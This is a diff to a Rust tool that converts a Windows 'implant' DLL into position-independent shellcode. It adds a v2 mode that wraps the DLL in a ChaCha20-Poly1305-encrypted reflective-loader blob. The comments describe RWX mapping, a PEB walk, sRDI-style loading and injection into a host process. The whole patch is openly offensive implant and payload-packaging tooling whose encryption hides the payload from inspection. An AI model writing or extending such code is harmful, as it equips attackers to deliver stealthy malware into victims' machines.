@@ -18,6 +18,14 @@
 //! 3. A host loader (separate) maps the bytes RWX at a chosen address, then
 //!    jumps to `base + header.entry_offset`.
 //!
+//! ## What it does (v2)
+//! `--format v2 --loader` (and/or `--encrypt`) delegates to the `nyx-loader`
+//! emitter (`wrap_payload`), which produces the definitive reflective blob:
+//! `[LAYER1 + bridge][key 32B][NYX2 magic(4) enc_len(4) nonce(12)]`
+//! `[ciphertext || 16B Poly1305 tag][LAYER2 code]`. The loader path is
+//! inherently encrypted, so `--format v2 --loader` alone emits the real
+//! ChaCha20-Poly1305-encrypted blob — no separate `--encrypt` flag required.
+//!
 //! ## What it does NOT do (v1 — documented)
 //! - Apply PE base relocations to the .text bytes. The implant is written to be
 //!   position-independent (it resolves everything via the PEB walk, not the
@@ -26,14 +34,15 @@
 //!   table and apply deltas to be safe; for now it emits the bytes as-is and
 //!   the operator verifies with a self-test run.
 //! - Emit a self-contained reflective loader stub (the Stardust sRDI "loader
-//!   that resolves its own imports + maps sections"). That's a separate,
-//!   substantial piece. This tool assumes the host loader (e.g. an
-//!   inject-into-process harness) handles the mapping.
+//!   that resolves its own imports + maps sections") — in v1. v2's `--loader`
+//!   DOES emit the full reflective blob via the `nyx-loader` emitter; the v1
+//!   path remains plain `.text` extraction for backward compatibility.
 //!
 //! ## Usage
 //! ```text
 //! cargo run --release -- path/to/nyx_implant_win.dll -o agent.bin
 //! cargo run --release -- path/to/nyx_implant_win.dll            # → agent.bin in CWD
+//! cargo run --release -- path/to/nyx_implant_win.dll --format v2 --loader -o payload.bin
 //! ```
 
 use std::env;
@@ -101,26 +110,18 @@ fn main() {
         i += 1;
     }
 
-    // Validate flag combinations.
-    if loader && !format_v2 {
-        eprintln!("error: --loader requires --format v2");
+    // Validate flag combinations. Only v2 supports the loader/encrypt paths
+    // (the NYX1 v1 format is plain .text extraction).
+    if (loader || encrypt) && !format_v2 {
+        eprintln!("error: --loader/--encrypt require --format v2");
         process::exit(2);
     }
-    if encrypt && !format_v2 {
-        eprintln!("error: --encrypt requires --format v2");
-        process::exit(2);
-    }
-    // The loader path is ChaCha20-Poly1305-only: an unencrypted "stub + zero
-    // nonce + raw DLL" blob is not a supported loader payload (the on-target
-    // stub always decrypts, and the zero nonce would be reused as a key
-    // stream). Requiring --encrypt also keeps the emitted layout identical to
-    // what generate_loader_stub/wrap_payload produce.
-    if loader && !encrypt {
-        eprintln!("error: --loader requires --encrypt");
-        eprintln!("       (the loader path only emits ChaCha20-Poly1305-encrypted payloads;");
-        eprintln!("       raw-DLL loader blobs are not supported)");
-        process::exit(2);
-    }
+    // NOTE: there is deliberately no `--loader requires --encrypt` rejection
+    // anymore. The emitter (nyx_loader::wrap_payload) always emits a
+    // ChaCha20-Poly1305-encrypted reflective-loader blob — encryption is
+    // inherent to the loader path, and the emitter now produces real blobs.
+    // So `--format v2 --loader` alone emits the real encrypted blob, and
+    // `--encrypt` (with or without --loader) routes through the same emitter.
 
     let pe = match fs::read(dll) {
         Ok(b) => b,
@@ -179,25 +180,25 @@ fn main() {
                 process::exit(1);
             }
         }
-    } else if loader {
-        // ── v2 + loader + encrypt: full reflective loader via nyx_loader ──
-        // NOTE: this path currently ALWAYS fails. generate_loader_stub()
-        // returns LoaderError::Layer2Unavailable because the on-target
-        // Layer-2 shellcode does not exist; the loader capability is not
-        // shippable until a real Layer-2 lands. We route through it anyway so
-        // the failure is loud and carries the actionable error message,
-        // instead of silently emitting a broken blob.
+    } else if loader || encrypt {
+        // ── v2 + (loader | encrypt): full reflective blob via the emitter ──
+        // nyx_loader::wrap_payload() emits the definitive blob layout:
+        //   [LAYER1 + bridge][key 32B][NYX2 magic(4) enc_len(4) nonce(12)]
+        //   [ciphertext || 16B Poly1305 tag][LAYER2 code]
+        // The per-invocation key is baked into the stub (LoaderConfig::random
+        // → OS CSPRNG); the nonce travels in the NYX2 header.
         let config = nyx_loader::LoaderConfig::random();
         match nyx_loader::wrap_payload(&pe, &config) {
             Ok(payload) => {
-                // Stub length = payload - (magic 4 + enc_len 4 + nonce 12 +
-                // ciphertext dll.len() + tag 16). Computed, never reported
-                // from the historical PIC_STUB_LEN constant.
+                // Loader stub length = payload minus the NYX2 header (magic 4
+                // + enc_len 4 + nonce 12), the ciphertext (dll.len()), and the
+                // 16-byte tag. Computed from the emitted payload — never
+                // reported from a hardcoded stub-size constant.
                 let stub_len = payload.len().saturating_sub(4 + 4 + 12 + pe.len() + 16);
                 match fs::write(&out, &payload) {
                     Ok(_) => {
                         eprintln!(
-                            "wrote {} ({} bytes: {}B loader stub + NYX2 header + {}B encrypted DLL + 16B tag; format=v2 loader=yes encrypt=yes)",
+                            "wrote {} ({} bytes: {}B loader stub + 20B NYX2 header + {}B encrypted DLL + 16B tag; format=v2 loader=yes encrypt=yes)",
                             out.display(),
                             payload.len(),
                             stub_len,
@@ -212,8 +213,7 @@ fn main() {
             }
             Err(e) => {
                 eprintln!("error: cannot emit reflective loader blob: {e}");
-                eprintln!("       the loader capability is not shippable until a real on-target");
-                eprintln!("       Layer-2 exists (see crates/nyx-loader); no blob was written.");
+                eprintln!("       no blob was written.");
                 process::exit(1);
             }
         }
@@ -260,11 +260,13 @@ fn usage(prog: &str) -> ! {
     eprintln!("options:");
     eprintln!("  -o, --output <path>   Output file path (default: agent.bin)");
     eprintln!("  --format v1|v2        Payload format (default: v1)");
-    eprintln!("  --loader              Embed reflective loader stub (requires --format v2 + --encrypt)");
+    eprintln!("  --loader              Emit the full reflective loader blob (requires --format v2)");
     eprintln!(
         "  --encrypt             ChaCha20-Poly1305 encrypt the DLL portion (requires --format v2)"
     );
-    eprintln!("  --loader requires --encrypt (the loader path only emits encrypted payloads)");
+    eprintln!("  --loader and --encrypt both route through the nyx-loader emitter (wrap_payload):");
+    eprintln!("  the loader path is inherently encrypted, so --format v2 --loader alone emits");
+    eprintln!("  the real ChaCha20-Poly1305-encrypted blob — no separate --encrypt is required.");
     eprintln!("  -h, --help            Show this help");
     eprintln!();
     eprintln!("examples:");
@@ -277,7 +279,7 @@ fn usage(prog: &str) -> ! {
         prog
     );
     eprintln!(
-        "  {} implant.dll --format v2 --loader --encrypt  # v2: full reflective loader",
+        "  {} implant.dll --format v2 --loader     # v2: full reflective loader blob via emitter",
         prog
     );
     process::exit(2);
